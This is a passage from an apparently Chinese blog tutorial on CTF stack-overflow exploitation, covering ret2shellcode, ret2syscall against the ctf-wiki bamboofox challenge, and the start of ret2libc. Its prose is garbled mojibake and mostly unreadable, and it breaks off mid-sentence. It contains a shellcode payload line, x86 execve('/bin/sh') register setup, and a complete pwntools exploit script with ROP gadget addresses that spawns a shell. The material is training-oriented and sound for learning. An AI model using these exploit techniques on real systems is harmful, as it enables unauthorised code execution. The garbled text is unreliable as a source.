class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>æ³¨æ„ä¸€ä¸‹payload: <code>shellcode.ljust(112, &#39;A&#39;) + p32(buf2_addr)</code><br>é¦–å…ˆæˆ‘ä»¬å°†payloadè¾“å…¥åˆ°å˜é‡sä¹Ÿå°±æ˜¯æ ˆä¸Šï¼Œç„¶åå°†mainå‡½æ•°çš„è¿”å›åœ°å€è¦†ç›–ä¸ºbuf2_addrï¼ˆ<em>éœ€è¦æ­¤bssæ®µå¯æ‰§è¡Œ</em>)ï¼Œä¹‹åmainå‡½æ•°æ‰§è¡Œstrncpy(buf2,&amp;s,100u);ï¼ˆè™½ç„¶shellcodeè¢«æˆªæ–­ä¸º100ï¼Œä½†æ˜¯è¢«æˆªæ–­çš„å†…å®¹åªæ˜¯Aï¼Œå¹¶ä¸å½±å“shellcodeçš„å®Œæ•´åº¦ï¼‰ï¼Œå°†å†…å®¹å¤åˆ¶åˆ°äº†buf2ï¼Œ<strong>ç”±äºmainå‡½æ•°çš„è¿”å›åœ°å€è¢«è¦†ç›–ä¸ºshellcodeçš„åœ°å€ï¼Œå› æ­¤åœ¨mainå‡½æ•°æ‰§è¡Œå®Œæ¯•ä¹‹åï¼ŒElPè½¬å‘æ‰§è¡Œshellcode</strong></p><p><strong><em>bssæ®µå¯æ‰§è¡Œæ—¶ï¼Œå¯æˆåŠŸgetshell</em></strong></p><h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a><strong>ret2syscall</strong></h2><h3 id="åˆ©ç”¨åŸç†"><a href="#åˆ©ç”¨åŸç†" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h3><p><strong><em>ret to syscallï¼Œå°±æ˜¯è°ƒç”¨ç³»ç»Ÿå‡½æ•°ä»¥è¾¾åˆ°getshellçš„ç›®çš„</em></strong><br>åœ¨è®¡ç®—ä¸­ï¼Œç³»ç»Ÿè°ƒç”¨æ˜¯ä¸€ç§ç¼–ç¨‹æ–¹å¼ï¼Œè®¡ç®—æœºç¨‹åºä»è¯¥ç¨‹åºä¸­å‘æ‰§è¡Œå…¶çš„æ“ä½œç³»ç»Ÿå†…æ ¸è¯·æ±‚æœåŠ¡ã€‚è¿™å¯èƒ½åŒ…æ‹¬ä¸ç¡¬ä»¶ç›¸å…³çš„æœåŠ¡ï¼ˆä¾‹å¦‚ï¼Œè®¿é—®ç¡¬ç›˜é©±åŠ¨å™¨ï¼‰ï¼Œåˆ›å»ºå’Œæ‰§è¡Œæ–°è¿›ç¨‹ä»¥åŠä¸è¯¸å¦‚è¿›ç¨‹è°ƒåº¦ä¹‹ç±»çš„é›†æˆå†…æ ¸æœåŠ¡è¿›è¡Œé€šä¿¡ã€‚ç³»ç»Ÿè°ƒç”¨æä¾›<br>äº†è¿›ç¨‹ä¸æ“ä½œç³»ç»Ÿä¹‹é—´çš„åŸºæœ¬æ¥å£ã€‚<br>è‡³äºç³»ç»Ÿè°ƒç”¨åœ¨å…¶ä¸­å……å½“ä»€ä¹ˆè§’è‰²ï¼Œç¨åå†çœ‹ï¼Œç°åœ¨æˆ‘ä»¬è¦åšçš„æ˜¯ï¼šè®©ç¨‹åºè°ƒç”¨execve(â€œ/bin/shâ€,NULL,NULL)å‡½æ•°å³å¯æ‹¿åˆ°shell</p><h3 id="æ­¥éª¤"><a href="#æ­¥éª¤" class="headerlink" title="æ­¥éª¤"></a>æ­¥éª¤</h3><p><strong>æ±‡ç¼–å±‚é¢è°ƒç”¨shell</strong></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">mov eax, 0xbmov ebx, [&quot;&#x2F;bin&#x2F;sh&quot;]  ;[&quot;&#x2F;bin&#x2F;sh&quot;]è¡¨ç¤ºå­˜æ”¾å­—ç¬¦ä¸²&quot;&#x2F;bin&#x2F;sh&quot;çš„åœ°å€mov ecx, 0mov edx, 0int 0x80<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è°ƒç”¨æ­¤å‡½æ•°çš„å…·ä½“çš„æ­¥éª¤æ˜¯è¿™æ ·çš„ï¼šå› ä¸º<strong>è¯¥ç¨‹åºæ˜¯32ä½</strong>ï¼Œæ‰€ä»¥ï¼š</p><ul><li><code>eax</code> åº”è¯¥ä¸º <code>0xb</code></li><li><code>ebx</code>åº”è¯¥æŒ‡å‘<code>/bin/sh</code>çš„åœ°å€ï¼Œå…¶å®æ‰§è¡Œ<code>sh</code>çš„åœ°å€ä¹Ÿå¯ä»¥</li><li><code>ecx</code>åº”è¯¥ä¸º<code>0</code></li><li><code>edx</code>åº”è¯¥ä¸º<code>0</code></li><li>æœ€åå†æ‰§è¡Œ<code>int 0x80</code>è§¦å‘ä¸­æ–­å³å¯æ‰§è¡Œ<code>execve()</code>è·å–shell<br>ç³»ç»Ÿåœ¨è¿è¡Œçš„æ—¶å€™ä¼šä½¿ç”¨ä¸Šé¢å››ä¸ªå¯„å­˜å™¨ï¼Œæ‰€ä»¥é‚£ä¹ˆä¸Šé¢å†…å®¹æˆ‘ä»¬å¯ä»¥å†™ä¸º<code>int 0x80(eax,ebx,ecx,edx)</code>ã€‚åªè¦æˆ‘ä»¬æŠŠå¯¹åº”è·å–shellçš„ç³»ç»Ÿè°ƒç”¨çš„å‚æ•°æ”¾åˆ°å¯¹åº”çš„å¯„å­˜å™¨ä¸­ï¼Œé‚£ä¹ˆæˆ‘ä»¬å†æ‰§è¡Œint0x80å°±å¯æ‰§è¡Œå¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨ã€‚<h3 id="ä½¿ç”¨å‰æ"><a href="#ä½¿ç”¨å‰æ" class="headerlink" title="ä½¿ç”¨å‰æ"></a>ä½¿ç”¨å‰æ</h3></li><li>å­˜åœ¨æ ˆæº¢å‡º<h3 id="å¦‚ä½•æ§åˆ¶è¿™äº›å¯„å­˜å™¨çš„å€¼ï¼Ÿ"><a href="#å¦‚ä½•æ§åˆ¶è¿™äº›å¯„å­˜å™¨çš„å€¼ï¼Ÿ" class="headerlink" title="å¦‚ä½•æ§åˆ¶è¿™äº›å¯„å­˜å™¨çš„å€¼ï¼Ÿ"></a>å¦‚ä½•æ§åˆ¶è¿™äº›å¯„å­˜å™¨çš„å€¼ï¼Ÿ</h3>åœ¨æˆ‘ä»¬æœ€å¼€å§‹å­¦ä¹ æ±‡ç¼–å‡½æ•°çš„æ—¶å€™ï¼Œæˆ‘ä»¬æœ€å¸¸ç”¨åˆ°çš„å°±æ˜¯pushï¼Œpopï¼ŒretæŒ‡ä»¤ï¼Œè€Œè¿™ä¸€æ¬¡æˆ‘ä»¬å°†ä½¿ç”¨popå’Œretçš„ç»„åˆæ¥æ§åˆ¶å¯„å­˜å™¨çš„å€¼ä»¥åŠæ‰§è¡Œæ–¹å‘ã€‚<blockquote><p>ä¾‹å¦‚ï¼šåœ¨ä¸€ä¸ªæ ˆä¸Šï¼Œ<em>å‡è®¾æ ˆé¡¶çš„å€¼ä¸º2ï¼Œå½“æˆ‘ä»¬pop eax,æ—¶ï¼Œ2å°±ä¼šå­˜è¿›eaxå¯„å­˜å™¨</em>ã€‚åŒæ ·çš„ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨åŒæ ·çš„æ–¹æ³•å®Œæˆexecve()å‡½æ•°å‚æ•°çš„æ§åˆ¶</p></blockquote></li></ul><pre class="line-numbers language-C" data-language="C"><code class="language-C">pop eax #ç³»ç»Ÿè°ƒç”¨å·è½½å…¥ï¼Œexecveä¸º0xbpop ebx #&#x2F;bin&#x2F;shdçš„stringpop ecx #ç¬¬äºŒä¸ªå‚æ•°ï¼Œ0pop edx #ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œ0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™æ ·å¯„å­˜å™¨çš„å€¼å¯ä»¥æ§åˆ¶äº†ã€‚ç„¶åä½¿ç”¨gadgetsè®©è¿™ä¸€è¿ä¸²çš„popå‘½ä»¤é¡ºåºè¿æ¥æ‰§è¡Œï¼Œæœ€åä½¿ç”¨çš„retæŒ‡ä»¤ï¼Œè¿›è€Œæ§åˆ¶ç¨‹åºæ‰§è¡Œæµç¨‹ã€‚</p><blockquote><p>ç®€å•çš„ç†è§£ï¼Œgadgetså°±æ˜¯ç¨‹åºä¸­çš„å°ç¢ç‰‡ï¼Œret2syscallå°±æ˜¯åˆ©ç”¨è¿™äº›å°ç¢ç‰‡æ¥æ‹¼æˆshellï¼Œä½¿ç”¨int 0x80ç³»ç»Ÿä¸­æ–­æ¥æ‰§è¡Œexecve()ï¼Œä»è€Œè¾¾æˆæ§åˆ¶ç³»ç»Ÿçš„ç›®çš„ã€‚</p></blockquote><h3 id="ç¤ºä¾‹-2"><a href="#ç¤ºä¾‹-2" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h3><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall">ctf-challenges/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall at master Â· ctf-wiki/ctf-challenges</a><br>è¿è¡Œ<br><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250123185858.png" alt="Pasted image 20250123185858"><br>checksec<br><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250123185747.png" alt="Pasted image 20250123185747"><br>32ä½ç¨‹åºï¼Œå¼€äº†NXä¿æŠ¤<br>å½“NXä¿æŠ¤å¼€å¯ï¼Œå°±è¡¨ç¤ºé¢˜ç›®ç»™äº†ä½ å…¨éƒ¨<code>system(&#39;/bin/sh&#39;ï¼‰</code>æˆ–éƒ¨åˆ†<code>&#39;/bin/sh&#39;</code>ï¼Œå¦‚æœå…³é—­ï¼Œè¡¨ç¤ºä½ éœ€è¦è‡ªå·±å»æ„é€ shellcode(ret2shellcode)<br>IDA<br><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250123190238.png" alt="Pasted image 20250123190238"><br>æ—¢ç„¶å¼€äº†NXä¿æŠ¤ï¼Œæˆ‘ä»¬å°±ä¸èƒ½ä½¿ç”¨<strong>ret2shellcode</strong>ï¼Œæ²¡æœ‰systemå‡½æ•°ï¼Œä¹Ÿæ— æ³•ä½¿ç”¨<strong>ret2text</strong>ï¼Œæˆ‘ä»¬ä½¿ç”¨ä¸€ç§å…¨æ–°çš„æ–¹æ³•ï¼š<strong>ret2syscall</strong>ã€‚<br>ä»IDAå¯ä»¥çœ‹åˆ°ï¼šç¨‹åºä»ç„¶ä½¿ç”¨äº†getså‡½æ•°ï¼Œå­˜åœ¨æ ˆæº¢å‡ºçš„æ¡ä»¶ã€‚<br>å¾ˆå®¹æ˜“æµ‹å¾—æˆ‘ä»¬éœ€è¦è¦†ç›–çš„è¿”å›åœ°å€ç›¸å¯¹äºv4çš„åç§»ä¸º112ã€‚æ­¤æ¬¡ï¼Œç”±äºæˆ‘ä»¬ä¸èƒ½ç›´æ¥åˆ©ç”¨ç¨‹åºä¸­çš„æŸä¸€æ®µä»£ç æˆ–è€…è‡ªå·²å¡«å†™ä»£ç æ¥è·å¾—shellï¼ˆå¼€äº†NXä¿æŠ¤ï¼Œæ ˆä¸Šçš„ä»£ç æ— æ³•æ‰§è¡Œ)ï¼Œæ‰€ä»¥æˆ‘ä»¬åˆ©ç”¨ç¨‹åºä¸­çš„gadgetsæ¥è·å¾—shellï¼Œè€Œå¯¹åº”çš„shellè·å–åˆ™æ˜¯åˆ©ç”¨ç³»ç»Ÿè°ƒç”¨ã€‚</p><p>åœ¨å‰é¢ä»‹ç»è¿‡ï¼Œåªè¦æˆ‘ä»¬æŠŠå¯¹åº”è·å–shellçš„ç³»ç»Ÿè°ƒç”¨çš„å‚æ•°æ”¾åˆ°å¯¹åº”çš„å¯„å­˜å™¨ä¸­ï¼Œé‚£ä¹ˆæˆ‘ä»¬åœ¨æ‰§è¡Œ<code>int 0x80</code>å°±å¯æ‰§è¡Œå¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨ã€‚æ¯”å¦‚è¯´è¿™é‡Œæˆ‘ä»¬åˆ©ç”¨execve(<strong>â€œ/bin/shâ€</strong>,<em>NULL</em>,<em>NULL</em>)ç³»ç»Ÿè°ƒç”¨æ¥è·å–shellã€‚<br>å…¶ä¸­ï¼Œè¯¥<strong>ç¨‹åºæ˜¯32ä½</strong>ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä½¿å¾—</p><ul><li>ç³»ç»Ÿè°ƒç”¨å·ï¼Œå³<code>eax</code>åº”è¯¥ä¸º<code>0xb</code></li><li>ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå³<code>ebx</code>åº”è¯¥æŒ‡å‘<code>/bin/sh</code>çš„åœ°å€ï¼Œå…¶å®æ‰§è¡Œ<code>sh</code>çš„åœ°å€ä¹Ÿå¯ä»¥ã€‚</li><li>ç¬¬äºŒä¸ªå‚æ•°ï¼Œå³<code>ecx</code>åº”è¯¥ä¸º<code>0</code></li><li>ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œå³<code>edx</code>åº”è¯¥ä¸º<code>0</code><br>è€Œæˆ‘ä»¬å¦‚ä½•æ§åˆ¶è¿™äº›å¯„å­˜å™¨çš„å€¼å‘¢ï¼Ÿè¿™é‡Œå°±éœ€è¦ä½¿ç”¨gadgetsã€‚å…·ä½“å¯»æ‰¾gadgets<br>çš„æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ropgadgetsè¿™ä¸ªå·¥å…·ã€‚</li><li>é¦–å…ˆï¼Œæˆ‘ä»¬æ¥å¯»æ‰¾æ§åˆ¶eaxçš„gadgets:<img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250123193603.png" alt="Pasted image 20250123193603"></li><li>å¯»æ‰¾æ§åˆ¶å…¶ä»–å¯„å­˜å™¨çš„gadgets:<img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250123193810.png" alt="Pasted image 20250123193810"></li><li>è·å¾—/bin/shå­—ç¬¦ä¸²å¯¹åº”çš„åœ°å€<img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250123193957.png" alt="Pasted image 20250123193957"></li><li>è·å¾—int 0x80çš„åœ°å€<img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250123194016.png" alt="Pasted image 20250123194016"><h3 id="ç¼–å†™exp"><a href="#ç¼–å†™exp" class="headerlink" title="ç¼–å†™exp"></a>ç¼–å†™exp</h3></li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python">#!&#x2F;usr&#x2F;bin&#x2F;env pythonfrom pwn import *sh &#x3D; process(&#39;.&#x2F;rop&#39;)pop_eax_ret &#x3D; 0x080bb196pop_edx_ecx_ebx_ret &#x3D; 0x0806eb90int_0x80 &#x3D; 0x08049421binsh &#x3D; 0x80be408payload &#x3D; flat(    [&#39;A&#39; * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])sh.sendline(payload)sh.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250123194802.png" alt="Pasted image 20250123194802"></p><blockquote><p>ä¸Šå›¾ä¸‹æ–¹ä¸ºé«˜åœ°å€</p></blockquote><h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a><strong>ret2libc</strong></h2><h3 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h3><p>ret2libcè¿™ç§æ”»å‡»æ–¹å¼ä¸»è¦æ˜¯é’ˆå¯¹<em>åŠ¨æ€é“¾æ¥(Dynamic linking)</em> [[1-6 åŠ¨æ€é“¾æ¥&amp;PLTè¡¨&amp;GOTè¡¨]]ç¼–è¯‘çš„ç¨‹åºï¼Œå› ä¸ºæ­£å¸¸æƒ…å†µä¸‹æ˜¯æ— æ³•åœ¨ç¨‹åºä¸­æ‰¾åˆ°åƒ<strong>system()ã€execve()</strong> è¿™ç§ç³»ç»Ÿçº§å‡½æ•°ã€‚<br>å› ä¸ºç¨‹åºæ˜¯åŠ¨æ€é“¾æ¥ç”Ÿæˆçš„ï¼Œæ‰€ä»¥åœ¨ç¨‹åºè¿è¡Œæ—¶ä¼šè°ƒç”¨<strong>libc.so</strong>ï¼ˆ<em>ç¨‹åºè¢«è£…è½½æ—¶ï¼ŒåŠ¨æ€é“¾æ¥å™¨ä¼šå°†ç¨‹åºæ‰€æœ‰æ‰€éœ€çš„åŠ¨æ€é“¾æ¥åº“åŠ è½½è‡³è¿›ç¨‹ç©ºé—´</em>ï¼Œ<strong>libc.so</strong>å°±æ˜¯å…¶ä¸­æœ€åŸºæœ¬çš„ä¸€ä¸ª)ï¼Œ<strong>libc.so</strong>æ˜¯linuxä¸‹Cè¯­è¨€åº“ä¸­çš„è¿è¡Œåº“<strong>glibc</strong>çš„åŠ¨æ€é“¾æ¥ç‰ˆï¼Œå¹¶ä¸”<strong>libc.so</strong>ä¸­åŒ…å«äº†å¤§é‡çš„å¯ä»¥åˆ©ç”¨çš„å‡½æ•°ï¼ŒåŒ…æ‹¬<strong>system()ã€execve()</strong> ç­‰ç³»ç»Ÿçº§å‡½æ•°ï¼Œ<em>æˆ‘ä»¬å¯ä»¥é€šè¿‡æ‰¾åˆ°è¿™äº›å‡½æ•°åœ¨å†…å­˜ä¸­çš„åœ°å€è¦†ç›–æ‰è¿”å›åœ°å€æ¥è·å¾—å½“å‰è¿›ç¨‹çš„æ§åˆ¶æƒ</em>ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä¼šé€‰æ‹©æ‰§è¡Œ<strong>system(â€œ/bin/shâ€)</strong> æ¥æ‰“å¼€shellï¼Œå¦‚æ­¤å°±åªå‰©ä¸‹ä¸¤ä¸ªé—®é¢˜ï¼š</p><blockquote><p>1.æ‰¾åˆ°system)å‡½æ•°çš„åœ°å€;<br>2.åœ¨å†…å­˜ä¸­æ‰¾åˆ°â€/bin/shâ€è¿™ä¸ªå­—ç¬¦ä¸²çš„åœ°å€ã€‚</p><h3 id="åˆ©ç”¨å‰æ-1"><a href="#åˆ©ç”¨å‰æ-1" class="headerlink" title="åˆ©ç”¨å‰æ"></a>åˆ©ç”¨å‰æ</h3><p>r2libcæŠ€æœ¯æ˜¯ä¸€ç§ç¼“å†²åŒºæº¢å‡ºåˆ©ç”¨æŠ€æœ¯ï¼Œä¸»è¦ç”¨äºå…‹æœå¸¸è§„ç¼“å†²åŒºæº¢å‡ºæ¼æ´åˆ©ç”¨æŠ€æœ¯ä¸­é¢ä¸´çš„no stack executableé™åˆ¶<br>(<strong>æ‰€ä»¥åç»­å®éªŒè¿˜æ˜¯éœ€è¦å…³é—­ç³»ç»Ÿçš„ASLRï¼Œä»¥åŠå †æ ˆä¿æŠ¤</strong>)<br>æ¯”å¦‚PaXå’ŒExecShieldå®‰å…¨ç­–ç•¥ã€‚è¯¥æŠ€æœ¯ä¸»è¦æ˜¯é€šè¿‡è¦†ç›–æ ˆå¸§ä¸­ä¿å­˜çš„å‡½æ•°è¿”å›åœ°å€(eip)ï¼Œè®©å…¶å®šä½åˆ°libcåº“ä¸­çš„æŸä¸ªåº“å‡½æ•°(å¦‚ï¼Œsystemç­‰)ï¼Œè€Œä¸æ˜¯ç›´æ¥å®šä½åˆ°shellcodeã€‚ç„¶åé€šè¿‡åœ¨æ ˆä¸­ç²¾å¿ƒæ„é€ è¯¥åº“å‡½æ•°çš„å‚æ•°ï¼Œä»¥ä¾¿è¾¾åˆ°ç±»ä¼¼äºæ‰§è¡Œshellcodeçš„ç›®çš„ã€‚</p></blockquote><h3 id="æŠ€æœ¯åŸç†"><a href="#æŠ€æœ¯åŸç†" class="headerlink" title="æŠ€æœ¯åŸç†"></a>æŠ€æœ¯åŸç†</h3><p><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250125141109.png" alt="Pasted image 20250125141109"></p><blockquote><p>Saved EIPæŒ‡ä¿å­˜callæŒ‡ä»¤ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€</p></blockquote><p>1) ä½¿ç”¨libcåº“ä¸­systemå‡½æ•°çš„åœ°å€è¦†ç›–æ‰åŸæœ¬çš„è¿”å›åœ°å€ï¼›è¿™æ ·åŸå‡½æ•°è¿”å›çš„æ—¶å€™ä¼šè½¬è€Œè°ƒç”¨systemå‡½æ•°ã€‚è·å–systemå‡½æ•°çš„è¿”å›åœ°å€å¾ˆç®€å•ï¼Œåªéœ€è¦ä½¿ç”¨gdbè°ƒè¯•ç›®æ ‡ç¨‹åºï¼Œåœ¨mainå‡½æ•°ä¸‹æ–­ç‚¹ï¼Œç¨‹åºè¿è¡Œä¸­æ–­åœ¨æ–­ç‚¹å¤„åï¼Œä½¿ç”¨<code>p system</code>å‘½ä»¤å³å¯:</p><blockquote><p>è¯¥æ–¹æ³•å¯ä»¥è·å–ä»»æ„libcå‡½æ•°çš„åœ°å€ã€‚<br>2) è®¾ç½®systemå‡½æ•°è¿”å›åçš„åœ°å€ï¼Œä»¥åŠä¸ºsystemå‡½æ•°æ„é€ æˆ‘ä»¬é¢„å®šçš„å‚æ•°ã€‚</p></blockquote><p>éš¾ç‚¹ä¸»è¦åœ¨ç¬¬2æ­¥ä¸­systemå‡½æ•°ç›¸å…³çš„æ ˆå¸§ç»“æ„çš„å®‰æ’ä¸Šï¼Œæ¯”å¦‚ä¸ºä»€ä¹ˆFillerå°±æ˜¯Return Address After systemï¼Œä¸ºä»€ä¹ˆä¼ é€’ç»™systemçš„å‚æ•°ç´§è·Ÿåœ¨Fillterä¹‹åï¼Ÿè¿™å°±æ¶‰åŠåˆ°å‡½æ•°çš„è°ƒç”¨è§„åˆ™ã€‚æˆ‘ä»¬çŸ¥é“<strong>å‡½æ•°è°ƒç”¨åœ¨æ±‡ç¼–ä¸­é€šè¿‡callæŒ‡ä»¤å®ç°ï¼Œè€Œå‡½æ•°è¿”å›åˆ™é€šè¿‡retæŒ‡ä»¤å®ç°</strong>ã€‚CallæŒ‡ä»¤å¯ä»¥å®ç°å¤šç§æ–¹å¼çš„å‡½æ•°è·³è½¬ï¼Œè¿™é‡Œä¸ºäº†ç®€ä¾¿ï¼Œæš‚ä¸”åªè€ƒè™‘è·³è½¬åœ°å€åœ¨å†…å­˜ä¸­çš„callæŒ‡ä»¤çš„å®ç°</p><p>CPUåœ¨æ‰§è¡ŒcallæŒ‡ä»¤æ—¶éœ€è¦è¿›è¡Œä¸¤æ­¥æ“ä½œï¼š</p><ol><li>å°†å½“å‰çš„IP(ä¹Ÿå°±æ˜¯å‡½æ•°è¿”å›åœ°å€)å…¥æ ˆï¼Œå³ï¼š<code>push IP</code>;</li><li>è·³è½¬ï¼Œå³ï¼š <code>jmp dword ptr å†…å­˜å•å…ƒåœ°å€</code>ã€‚</li></ol><p>CPUåœ¨æ‰§è¡ŒretæŒ‡ä»¤æ—¶åªéœ€è¦æ¢å¤IPå¯„å­˜å™¨å³å¯ï¼Œå› æ­¤retæŒ‡ä»¤ç›¸å½“äº<code>pop IP</code>ã€‚<br>å› æ­¤å¯¹äºæ­£å¸¸å‡½æ•°è°ƒç”¨è€Œè¨€ï¼Œå…¶æ ˆå¸§ç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š<br><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250125141603.png" alt="Pasted image 20250125141603"><br>ä½†æ˜¯ç”±äºæˆ‘ä»¬ä½¿ç”¨systemçš„å‡½æ•°åœ°å€æ›¿æ¢äº†åŸæœ¬çš„IPå¯„å­˜å™¨ï¼Œå¼ºåˆ¶æ‰§è¡Œsystemå‡½æ•°ï¼Œç ´åäº†åŸç¨‹åºçš„æ ˆå¸§åˆ†é…å’Œé‡Šæ”¾ç­–ç•¥ï¼Œæ‰€ä»¥åç»­çš„æ“ä½œå¿…é¡»åŸºäºè¿™ä¸ªè¢«ç ´åçš„æ ˆå¸§ç»“æ„å®ç°ã€‚</p><h4 id="ä¸ºä½•Filleræ˜¯å‡½æ•°çš„è¿”å›åœ°å€"><a href="#ä¸ºä½•Filleræ˜¯å‡½æ•°çš„è¿”å›åœ°å€" class="headerlink" title="ä¸ºä½•Filleræ˜¯å‡½æ•°çš„è¿”å›åœ°å€"></a>ä¸ºä½•Filleræ˜¯å‡½æ•°çš„è¿”å›åœ°å€</h4><p>è¿™éœ€è¦æˆ‘ä»¬æŸ¥çœ‹systemå‡½æ•°çš„æ±‡ç¼–å®ç°ã€‚é€šè¿‡ gdbè°ƒè¯•å¾—åˆ°å¦‚ä¸‹ä¿¡æ¯ï¼š<br><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250125141829.png" alt="Pasted image 20250125141829"><br>æ­£å¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬æ˜¯é€šè¿‡callæŒ‡ä»¤è¿›è¡Œå‡½æ•°è°ƒç”¨çš„ï¼Œå› æ­¤åœ¨è¿›å…¥åˆ°systemå‡½æ•°ä¹‹å‰ï¼ŒcallæŒ‡ä»¤å·²ç»é€šè¿‡push IPå°†å…¶è¿”å›åœ°å€pushåˆ°æ ˆå¸§ä¸­äº†ï¼Œæ‰€ä»¥åœ¨æ­£å¸¸æƒ…å†µä¸‹retæŒ‡ä»¤popåˆ° IPçš„æ•°æ®å°±æ˜¯ä¹‹å‰callæŒ‡ä»¤pushåˆ°æ ˆå¸§çš„æ•°æ®ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸¤è€…æ˜¯æˆå¯¹çš„ã€‚ä½†æ˜¯åœ¨æˆ‘ä»¬çš„æ¼æ´åˆ©ç”¨ä¸­ï¼Œç›´æ¥é€šè¿‡è¦†ç›–IPåœ°å€è·³è½¬åˆ°äº†systemå‡½æ•°ï¼Œè€Œå¹¶æ²¡æœ‰ç»è¿‡callè°ƒç”¨ï¼Œä¹Ÿå³æ˜¯æ²¡æœ‰push IPçš„æ“ä½œï¼Œä½†æ˜¯systemå‡½æ•°å´ç…§å¸¸è¿›è¡Œäº†retæŒ‡ä»¤çš„pop IPæ“ä½œã€‚é‚£ä¹ˆè¿™ä¸ªretæŒ‡ä»¤popåˆ°IPçš„æ˜¯å“ªä¸€å¤„åœ°å€çš„æ•°æ®å‘¢ï¼Ÿç­”æ¡ˆå°±æ˜¯Filler!<br>åœ¨ç¨‹åºæ‰§è¡Œåˆ°å›¾ä¸­çš„Saved EIP(å³systemå‡½æ•°åœ°å€)çš„æ—¶å€™ï¼Œæ­¤æ—¶çš„ESPæŒ‡å‘äº†Fillerï¼Œç„¶åå°±è½¬è€Œæ‰§è¡Œsystemå‡½æ•°ã€‚é€šè¿‡åˆ†æsystemå‡½æ•°çš„æ±‡ç¼–å®ç°å¯ä»¥çœ‹å‡ºï¼šè¯¥å‡½æ•°ä¸­å¯¹ESPçš„æ“ä½œéƒ½æ˜¯æˆå¯¹å‡ºç°çš„ï¼Œå¦‚<code>push %ebx</code>ä¸<code>pop %ebx</code>ç­‰ã€‚æ‰€ä»¥å½“æ‰§è¡Œåˆ°retæŒ‡ä»¤æ—¶ï¼ŒESPè¿˜æ˜¯æŒ‡å‘Fillerï¼Œä¹Ÿå°±æ˜¯è¯´retæŒ‡ä»¤å†…æ¶µçš„pop IPæ“ä½œå°±æ˜¯å°†Fillerçš„æ•°æ®popåˆ°IPå¯„å­˜å™¨ä¸­ï¼</p><h4 id="ä¸ºä½•ä¼ é€’ç»™systemçš„å‚æ•°ç´§è·Ÿåœ¨Fillerä¹‹å"><a href="#ä¸ºä½•ä¼ é€’ç»™systemçš„å‚æ•°ç´§è·Ÿåœ¨Fillerä¹‹å" class="headerlink" title="ä¸ºä½•ä¼ é€’ç»™systemçš„å‚æ•°ç´§è·Ÿåœ¨Fillerä¹‹å"></a>ä¸ºä½•ä¼ é€’ç»™systemçš„å‚æ•°ç´§è·Ÿåœ¨Fillerä¹‹å</h4><p>åœ¨æ­£å¸¸çš„å‡½æ•°è°ƒç”¨ä¸­ï¼Œå…¶æ ˆå¸§åˆ†å¸ƒå¦‚å›¾1-2æ‰€ç¤ºï¼Œä½†æ˜¯åœ¨æ­¤æ¼æ´åˆ©ç”¨ä¸­ï¼Œç”±äºæˆ‘ä»¬å¼ºåˆ¶æ›´æ”¹äº†è°ƒç”¨è¿‡ç¨‹ï¼Œçœå»äº†callè°ƒç”¨çš„push IPæ­¥éª¤ï¼Œå› æ­¤å°±é€ æˆäº†<strong>Fillerå˜æˆäº†EIP</strong>ã€‚ä½†æ˜¯ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬ä¹Ÿä»…ä»…æ˜¯çœå»äº†push 